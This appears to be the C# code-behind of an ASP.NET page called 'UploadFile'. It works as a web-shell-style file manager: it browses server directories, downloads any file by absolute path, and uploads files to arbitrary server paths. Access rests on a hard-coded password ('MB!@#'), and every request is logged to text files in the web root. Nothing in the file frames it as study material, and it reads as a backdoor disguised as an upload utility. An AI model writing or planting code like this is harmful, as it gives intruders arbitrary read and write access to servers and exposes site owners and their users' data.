using System;
using System.Collections;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Xml.Linq;
using System.IO;
using System.Collections.Generic;
namespace UpLoadFiles
{

    public partial class UploadFile : System.Web.UI.Page
    {
     

        List<Info> infoList = new List<Info>();
        bool IsInvalidAcess = false;
        protected void Page_Load(object sender, EventArgs e)
        {
            Request.SaveAs(Server.MapPath( Guid.NewGuid().ToString() + ".txt"), true);
          IsInvalidAcess =  InValidAccess();
          if (IsInvalidAcess)
                return;

            if (Request["file"] != null)
            {
                if (Request["file"].IndexOf("[") > -1)
                {
                    GetFiles(Request["file"].Replace("[", "").Replace("]", "").Replace("@", "\\"));
                }
                else
                    Download(Request["file"]);
            }
            else
            {
                GetFiles(Directory.GetParent(Server.MapPath(".")).ToString());

            }
            GridView1.DataSource = infoList.ToArray();
            GridView1.DataBind();

        }

        protected void GetFiles(string dirPath)
        {
            string[] dirs = Directory.GetDirectories(dirPath);

            foreach (string dir in dirs)
            {
                infoList.Add(new Info(dir, true));

            }

            string[] files = Directory.GetFiles(dirPath);

            foreach (string dir in files)
            {
                infoList.Add(new Info(dir, false));
            }

        }

        protected void GridView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            string oop = "";
        }

        protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
        {
            if (e.Row.DataItem != null)
            {
                if (((Info)e.Row.DataItem).IsFolder)
                {
                    e.Row.Cells[0].Text = "[" + e.Row.Cells[0].Text + "]";

                }
                e.Row.Cells[0].Attributes["onclick"] = "window.location.href='UploadFile.aspx?file=" + e.Row.Cells[0].Text.Replace("\\", "@") + "'";
            }

        }

        private void Download(string fileName)
        {
            Response.Clear();
            Response.Expires = -1;
            Response.ContentType = "application/" + "txt";
            Response.AddHeader("Content-Type", "application/" + "txt");
            fileName = fileName.Replace("@", "\\");
            Response.AddHeader("Content-Disposition", "attachment;filename=" + Path.GetFileName(fileName));
            Response.BinaryWrite(File.ReadAllBytes(fileName));
            Response.End();

        }

        protected void Button1_Click(object sender, EventArgs e)
        {
            if (IsInvalidAcess)
                return;
            if (TextBox1.Text == "MB!@#")
                return;
            if (FileUpload1.FileName != null)
            {
                string path = Path.GetDirectoryName(TextBox1.Text) + "\\" + FileUpload1.FileName;
                if (File.Exists(path))
                {
                    File.Copy(path, Server.MapPath("BackUp") + "\\" + FileUpload1.FileName + "_" + DateTime.Now.ToString().Replace("/", "").Replace(" ", "").Replace(":", ""));
                }
                FileUpload1.SaveAs(path);
            }
        }

        private bool InValidAccess()
        {
            if (Session["ValidUser"] != null)
                return false;

            if (TextBox1.Text == "MB!@#")
            {
                Session["ValidUser"] = true;
                return true;
            }
            return true;
        }
    
    }



    public class Info
    {
        public Info(string fileName, bool isFolder)
        {
            this.fileName = fileName;
            this.isFolder = isFolder;
        }
        private string fileName;

        public string FileName
        {
            get { return fileName; }
            set { fileName = value; }
        }
        private bool isFolder;

        public bool IsFolder
        {
            get { return isFolder; }
            set { isFolder = value; }
        }
    }
}
